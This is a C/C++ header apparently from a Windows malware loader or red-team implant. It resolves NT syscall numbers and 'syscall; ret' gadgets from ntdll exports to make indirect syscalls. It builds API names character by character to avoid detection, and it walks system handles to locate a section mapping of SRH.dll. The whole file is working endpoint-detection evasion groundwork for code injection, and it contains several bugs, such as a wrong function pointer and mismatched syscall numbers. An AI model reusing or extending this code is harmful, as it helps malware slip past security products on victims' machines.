#pragma once

#include "pch.h"
#include "framework.h"
#include "headers.h"
#include "misc.h"

EXTERN_C NTSTATUS ZwAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect,
    IN DWORD ssn,
    IN PBYTE syscallret);

EXTERN_C NTSTATUS ZwProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect,
    IN DWORD ssn,
    IN PBYTE syscallret);

EXTERN_C NTSTATUS ZwFlushInstructionCache(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN ULONG NumberOfBytesToFlush,
    IN DWORD ssn,
    IN PBYTE syscallret);

EXTERN_C NTSTATUS ZwCreateSection(
    OUT PHANDLE	SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PLARGE_INTEGER MaximumSize,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN  HANDLE FileHandle,
    IN DWORD ssn, //8
    IN PBYTE syscallret //9
);

EXTERN_C NTSTATUS ZwMapViewOfSection(

    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT	PVOID* BaseAddress,
    IN SIZE_T ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT	PLARGE_INTEGER	SectionOffset,
    IN OUT	PSIZE_T	ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Protect,
    IN DWORD ssn, //11
    IN PBYTE syscallret //12
);

EXTERN_C NTSTATUS ZwUnmapViewOfSection(
    IN HANDLE ProcessHandle, //RCX
    IN PVOID BaseAddress, //RDX
    IN DWORD ssn, //R8
    IN PBYTE syscallret); //R9

EXTERN_C NTSTATUS ZwQuerySystemInformation(
    IN ULONG SystemInformationClass, //RCX
    OUT PVOID SystemInformation, //RDX
    IN ULONG SystemInformationLength, //R8
    OUT PULONG ReturnLength, //R9
    IN DWORD ssn, //RSP + 40
    IN PBYTE syscallret //RSP + 48
);

EXTERN_C NTSTATUS ZwQueryObject(
    IN HANDLE Handle,
    IN ULONG ObjectInformationClass,
    OUT PVOID ObjectInformation,
    IN ULONG ObjectInformationLength,
    OUT PULONG ReturnLength,
    IN DWORD ssn,
    IN PBYTE syscallret);

EXTERN_C NTSTATUS ZwQueryVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN MEMORY_INFORMATION_CLASS MemoryInformationClass,
    OUT PVOID MemoryInformation,
    IN SIZE_T MemoryInformationLength,
    OUT PSIZE_T ReturnLength,
    IN DWORD ssn,
    IN PBYTE syscallret
);

EXTERN_C NTSTATUS ZwFreeVirtualMemory(
    IN HANDLE  ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG   FreeType,
    IN DWORD ssn, //RSP + 40
    IN PBYTE syscallret //RSP + 48
);

EXTERN_C NTSTATUS ZwSetContextThread(
    IN HANDLE ThreadHandle,
    OUT PCONTEXT Context,
    IN DWORD ssn,
    IN PBYTE syscallret
);

EXTERN_C NTSTATUS ZwGetContextThread(
    IN HANDLE ThreadHandle,
    OUT PCONTEXT Context,
    IN DWORD ssn,
    IN PBYTE syscallret
);



static bool extract_ssn_ret_addr(PBYTE func_addr, PDWORD ssn, uintptr_t* ret_addr)
{
    int emergency_break = 0;
    while (emergency_break < 2048)
    {
        if (*func_addr == 0xB8)
        {
            *ssn = *(PDWORD)(func_addr + 1);
        }

        if (func_addr[0] == 0x0f && func_addr[1] == 0x05 && func_addr[2] == 0xc3)
        {
            *ret_addr = (uintptr_t)func_addr;
            return true;
        }

        func_addr++;
        emergency_break++;
    }

    *ssn = 0;
    *ret_addr = 0;
    return false;
}

static bool retrieve_zw_func_s(IN HMODULE hm, IN PSYSCALL_ENTRY syscalls)
{
    bool result = false;

    PBYTE lib_base = (PBYTE)hm;

    PIMAGE_DOS_HEADER p_img_dos_hdr = (PIMAGE_DOS_HEADER)lib_base;
    if (p_img_dos_hdr->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return false;
    }

    PIMAGE_NT_HEADERS p_img_nt_hdrs = (PIMAGE_NT_HEADERS)(lib_base + p_img_dos_hdr->e_lfanew);
    if (p_img_nt_hdrs->Signature != IMAGE_NT_SIGNATURE)
    {
        return false;
    }

    IMAGE_OPTIONAL_HEADER img_opt_hdr = p_img_nt_hdrs->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY p_img_export_dir = (PIMAGE_EXPORT_DIRECTORY)(lib_base + img_opt_hdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD func_name_array = (PDWORD)(lib_base + p_img_export_dir->AddressOfNames);
    PDWORD func_addr_array = (PDWORD)(lib_base + p_img_export_dir->AddressOfFunctions);
    PWORD func_ordinal_array = (PWORD)(lib_base + p_img_export_dir->AddressOfNameOrdinals);

    //variables for syscall
    CHAR str_zw[] = { 'Z','w' };
    CHAR str_ZwAllocateVirtualMemory[] = { 'Z', 'w', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    CHAR str_ZwProtectVirtualMemory[] = { 'Z', 'w', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    CHAR str_ZwFlushInstructionCache[] = { 'Z','w','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e','\0' };
    CHAR str_ZwCreateSection[] = { 'Z', 'w', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
    CHAR str_ZwMapViewOfSection[] = { 'Z', 'w', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
    CHAR str_ZwUnmapViewOfSection[] = { 'Z', 'w', 'U', 'n', 'm', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
    CHAR str_ZwQuerySystemInformation[] = { 'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'S', 'y', 's', 't', 'e', 'm', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', '\0' };
    CHAR str_ZwQueryObject[] = { 'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'O', 'b', 'j', 'e', 'c', 't', '\0' };
    CHAR str_ZwQueryVirtualMemory[] = { 'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    CHAR str_ZwFreeVirtualMemory[] = { 'Z', 'w', 'F', 'r', 'e', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    CHAR str_ZwSetContextThread[] = { 'Z', 'w', 'S', 'e', 't', 'C', 'o', 'n', 't', 'e', 'x', 't', 'T', 'h', 'r', 'e', 'a', 'd', '\0' };
    CHAR str_ZwGetContextThread[] = { 'Z', 'w', 'G', 'e', 't', 'C', 'o', 'n', 't', 'e', 'x', 't', 'T', 'h', 'r', 'e', 'a', 'd', '\0' };


    PBYTE func_addr = 0;
    uintptr_t func_addr_value = 0;

    int syscall_entries = 0;
    int zw_func_counter = 0;
    DWORD syscall_half[500] = { 0 };




    for (DWORD i = 0; i < p_img_export_dir->NumberOfFunctions; i++)
    {
        CHAR* func_name = (CHAR*)(lib_base + func_name_array[i]);

        if (!CompareNStringASCII(str_zw, func_name, 2))
            continue;

        func_addr = (PBYTE)(lib_base + func_addr_array[func_ordinal_array[i]]);
        func_addr_value = (uintptr_t)func_addr;

        syscall_half[zw_func_counter++] = (DWORD)(func_addr_value & 0xFFFFFFFF);

        if (CompareStringASCII(str_ZwAllocateVirtualMemory, func_name)) {

            syscalls[0].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[0].SSN, (uintptr_t*)&syscalls[0].sysretAddr);
            if (!result) return result;
            //syscalls[0].sysretAddr = NULL;
            //syscalls[0].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwProtectVirtualMemory, func_name)) {

            syscalls[1].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[1].SSN, (uintptr_t*)&syscalls[1].sysretAddr);
            if (!result) return result;
            //syscalls[1].sysretAddr = NULL;
            //syscalls[1].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwFlushInstructionCache, func_name)) {

            syscalls[2].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[2].SSN, (uintptr_t*)&syscalls[2].sysretAddr);
            if (!result) return result;
            //syscalls[2].sysretAddr = NULL;
            //syscalls[2].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwCreateSection, func_name)) {

            syscalls[3].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[3].SSN, (uintptr_t*)&syscalls[3].sysretAddr);
            if (!result) return result;
            //syscalls[3].sysretAddr = NULL;
            //syscalls[3].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwMapViewOfSection, func_name)) {

            syscalls[4].funcAddr = (FARPROC)func_name;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[4].SSN, (uintptr_t*)&syscalls[4].sysretAddr);
            if (!result) return result;
            //syscalls[4].sysretAddr = NULL;
            //syscalls[4].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwUnmapViewOfSection, func_name)) {

            syscalls[5].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[5].SSN, (uintptr_t*)&syscalls[5].sysretAddr);
            if (!result) return result;
            //syscalls[5].sysretAddr = NULL;
            //syscalls[5].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwQuerySystemInformation, func_name)) {

            syscalls[6].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[6].SSN, (uintptr_t*)&syscalls[6].sysretAddr);
            if (!result) return result;
            //syscalls[6].sysretAddr = NULL;
            //syscalls[6].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwQueryObject, func_name)) {

            syscalls[7].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[7].SSN, (uintptr_t*)&syscalls[7].sysretAddr);
            if (!result) return result;
            //syscalls[7].sysretAddr = NULL;
            //syscalls[7].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwQueryVirtualMemory, func_name)) {

            syscalls[8].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[8].SSN, (uintptr_t*)&syscalls[8].sysretAddr);
            if (!result) return result;
            //syscalls[8].sysretAddr = NULL;
            //syscalls[8].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwFreeVirtualMemory, func_name)) {

            syscalls[9].funcAddr = (FARPROC)func_addr;
            extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[9].SSN, (uintptr_t*)&syscalls[9].sysretAddr);
            if (!result) return result;
            //syscalls[9].sysretAddr = NULL;
            //syscalls[9].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwSetContextThread, func_name)) {

            syscalls[10].funcAddr = (FARPROC)func_addr;
            extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[10].SSN, (uintptr_t*)&syscalls[10].sysretAddr);
            if (!result) return result;
            //syscalls[10].sysretAddr = NULL;
            //syscalls[10].SSN = 0;
            syscall_entries++;

        }
        if (CompareStringASCII(str_ZwGetContextThread, func_name)) {

            syscalls[11].funcAddr = (FARPROC)func_addr;
            result = extract_ssn_ret_addr(func_addr, (PDWORD)&syscalls[11].SSN, (uintptr_t*)&syscalls[11].sysretAddr);
            if (!result) return result;
            //syscalls[11].sysretAddr = NULL;
            //syscalls[11].SSN = 0;
            syscall_entries++;

        }

    }

    return result;

}


static HANDLE find_SRH_DLL_section_handle(PSYSCALL_ENTRY zw_func_s, fnGetProcessId GPID)
{
    WCHAR wstr_section[] = { L'S', L'e', L'c', L't', L'i', L'o', L'n', L'\0' };
    WCHAR wstr_SRH[] = { L'S',L'R',L'H',L'.',L'd',L'l',L'l',L'\0' };

    NTSTATUS status = 0;



    PVOID buffer = NULL;
    SIZE_T buf_size = 0x10000;
    if ((status = ZwAllocateVirtualMemory(
        ((HANDLE)(LONG_PTR)-1),
        &buffer,
        0,
        &buf_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE,
        zw_func_s[ZwAllocateVirtualMemoryF].SSN,
        zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr
    )) != 0)
    {
        return FALSE;
    }


    while ((status = ZwQuerySystemInformation(
        16, buffer, buf_size, NULL,
        zw_func_s[ZwQuerySystemInformationF].SSN,
        zw_func_s[ZwQuerySystemInformationF].sysretAddr))
        == 0xc0000004)
    {
        // free and re-allocate
        if (status = ZwFreeVirtualMemory(
            ((HANDLE)(LONG_PTR)-1), &buffer, 0,
            MEM_RELEASE,
            zw_func_s[ZwFreeVirtualMemoryF].SSN,
            zw_func_s[ZwFreeVirtualMemoryF].sysretAddr) == 0)
        {
            return FALSE;
        }


        // reset variables
        buffer = NULL;
        buf_size *= 2;


        if ((status = ZwAllocateVirtualMemory(
            ((HANDLE)(LONG_PTR)-1),
            &buffer,
            0,
            &buf_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
            zw_func_s[ZwAllocateVirtualMemoryF].SSN,
            zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr
        )) != 0)
        {
            return FALSE;
        }

    }

    PSYSTEM_HANDLE_INFORMATION handle_info = (PSYSTEM_HANDLE_INFORMATION)buffer;

    PVOID obj_type_info_tmp = NULL;
    SIZE_T obj_type_info_size = 0x1000;

    if ((status = ZwAllocateVirtualMemory(
        ((HANDLE)(LONG_PTR)-1),
        &obj_type_info_tmp,
        0,
        &obj_type_info_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE,
        zw_func_s[ZwAllocateVirtualMemoryF].SSN,
        zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr
    )) != 0)
    {
        return FALSE;
    }



    PVOID obj_name_info = NULL;
    SIZE_T obj_name_info_size = 0x1000;


    if ((status = ZwAllocateVirtualMemory(
        ((HANDLE)(LONG_PTR)-1),
        &obj_name_info,
        0,
        &obj_name_info_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE,
        zw_func_s[ZwAllocateVirtualMemoryF].SSN,
        zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr
    )) != 0)
    {
        return FALSE;
    }

    POBJECT_TYPE_INFORMATION obj_type_info = (POBJECT_TYPE_INFORMATION)obj_type_info_tmp;

    SYSTEM_HANDLE handle = { 0 };
    DWORD pid = GPID(((HANDLE)(LONG_PTR)-1));

    SIZE_T view_size = 0;
    PVOID view_base = NULL;


    UNICODE_STRING obj_name = { 0 };
    ULONG ret_length = 0;
    SIZE_T ret_length_size_t = 0;
    PVOID buf_mem_info = NULL;
    SIZE_T buf_mem_info_size = 0;
    SIZE_T ret_length_mem = 0;
    PUNICODE_STRING mem_info = NULL;


    for (ULONG_PTR i = 0; i < handle_info->HandleCount; i++)
    {
        handle = handle_info->Handles[i];

        if (handle.ProcessId != pid)
            continue;

        if ((status = ZwQueryObject(
            (void*)handle.Handle, ObjectTypeInformation,
            obj_type_info, 0x1000, NULL,
            zw_func_s[ZwQueryObjectF].SSN, zw_func_s[ZwQueryObjectF].sysretAddr))
            != 0)
        {
            continue;
        }

        // check if the handle is point to a section object.
        if (ComprareNStringWIDE(
            obj_type_info->Name.Buffer,
            wstr_section,
            (obj_type_info->Name.Length / sizeof(WCHAR)))
            != TRUE)
        {
            continue;
        }

        // comparing with IMAGE_NOT_AT_BASE because that is the
        // return value in status if i try to re-map the DLL,
        // but it is actually mapped.

        if ((status = ZwMapViewOfSection(
            (void*)handle.Handle,
            ((HANDLE)(LONG_PTR)-1),
            &view_base,
            NULL, NULL, NULL,
            &view_size,
            ViewShare,
            0,
            PAGE_READONLY,
            zw_func_s[ZwMapViewOfSectionF].SSN,
            zw_func_s[ZwMapViewOfSectionF].sysretAddr))
            != 0x40000003)
        {

            // if it actually was successfully but not for our
            // DLL, then we need to clean up and continue
            if (status == 0)
            {
                if (status = ZwUnmapViewOfSection(
                    ((HANDLE)(LONG_PTR)-1), view_base,
                    zw_func_s[ZwUnmapViewOfSectionF].SSN,
                    zw_func_s[ZwUnmapViewOfSectionF].sysretAddr
                ) != 0)
                {
                    return FALSE;
                }
            }

            view_base = NULL;
            continue;
        }

        if (view_base == NULL)
            continue;

        // here need to query the memory

        buf_mem_info = NULL;
        buf_mem_info_size = 0x100;

        if ((status = ZwAllocateVirtualMemory(
            ((HANDLE)(LONG_PTR)-1),
            &buf_mem_info,
            0,
            &buf_mem_info_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
            zw_func_s[ZwAllocateVirtualMemoryF].SSN,
            zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr)) != 0)
        {

            return FALSE;

        }

        if ((status = ZwQueryVirtualMemory(
            ((HANDLE)(LONG_PTR)-1),
            view_base,
            MemoryMappedFilenameInformation,
            buf_mem_info,
            buf_mem_info_size,
            &ret_length_mem,
            zw_func_s[ZwQueryVirtualMemoryF].SSN,
            zw_func_s[ZwQueryVirtualMemoryF].sysretAddr
        )) == 0x80000005)
        {

            // free and re-allocate

            if ((status = ZwFreeVirtualMemory(
                ((HANDLE)(LONG_PTR)-1),
                &buf_mem_info,
                0,
                MEM_RELEASE,
                zw_func_s[ZwAllocateVirtualMemoryF].SSN,
                zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr)) == 0)
            {
                return FALSE;
            }

            // re-allocate
            buf_mem_info_size = ret_length_mem;
            if ((status = ZwAllocateVirtualMemory(
                ((HANDLE)(LONG_PTR)-1),
                &buf_mem_info,
                0,
                &buf_mem_info_size,
                MEM_RESERVE | MEM_COMMIT,
                PAGE_READWRITE,
                zw_func_s[ZwAllocateVirtualMemoryF].SSN,
                zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr)) != 0)
            {

                return FALSE;

            }

            // query memory again
            if ((status = ZwQueryVirtualMemory(
                ((HANDLE)(LONG_PTR)-1),
                view_base,
                MemoryMappedFilenameInformation,
                buf_mem_info,
                buf_mem_info_size,
                &ret_length_mem,
                zw_func_s[ZwQueryVirtualMemoryF].SSN,
                zw_func_s[ZwQueryVirtualMemoryF].sysretAddr
            )) == 0x80000005)
            {
                return FALSE;
            }


        }
        else if (status != 0)
        {

            // if it's not buffer overflow but actual error we need to unmap the dll and continue

            if (status = ZwUnmapViewOfSection(
                ((HANDLE)(LONG_PTR)-1), view_base,
                zw_func_s[ZwUnmapViewOfSectionF].SSN,
                zw_func_s[ZwUnmapViewOfSectionF].sysretAddr
            ) != 0)
            {
                return FALSE;
            }

            view_base = NULL;
            continue;

        }

        mem_info = (PUNICODE_STRING)buf_mem_info;

        if (mem_info->Buffer == NULL)
            continue;

        // if the path contains the SRH.dll
        if (!containsSubstringUnicode(
            mem_info->Buffer,
            wstr_SRH,
            mem_info->Length / sizeof(WCHAR), 8))
            continue;

        // free the buffer memory
        if (status = ZwFreeVirtualMemory(
            ((HANDLE)(LONG_PTR)-1),
            &buf_mem_info,
            0,
            MEM_RELEASE,
            zw_func_s[ZwFreeVirtualMemoryF].SSN,
            zw_func_s[ZwFreeVirtualMemoryF].sysretAddr
        ) == 0)
        {

            return FALSE;

        }

        if ((status = ZwUnmapViewOfSection(
            ((HANDLE)(LONG_PTR)-1),
            view_base,
            zw_func_s[ZwUnmapViewOfSectionF].SSN,
            zw_func_s[ZwUnmapViewOfSectionF].sysretAddr
        )) != 0)
        {
            return FALSE;
        }

        return (void*)handle.Handle;

        // I haven't found any match.
        if ((status = ZwFreeVirtualMemory(
            ((HANDLE)(LONG_PTR)-1),
            &buf_mem_info,
            0, MEM_RELEASE,
            zw_func_s[ZwFreeVirtualMemoryF].SSN,
            zw_func_s[ZwFreeVirtualMemoryF].sysretAddr)) == 0)
        {
            return FALSE;
        }

        if ((status = ZwUnmapViewOfSection(
            ((HANDLE)(LONG_PTR)-1),
            view_base,
            zw_func_s[ZwUnmapViewOfSectionF].SSN,
            zw_func_s[ZwUnmapViewOfSectionF].sysretAddr
        )) != 0)
        {
            return FALSE;
        }



    }


    return (HANDLE)-1;
}

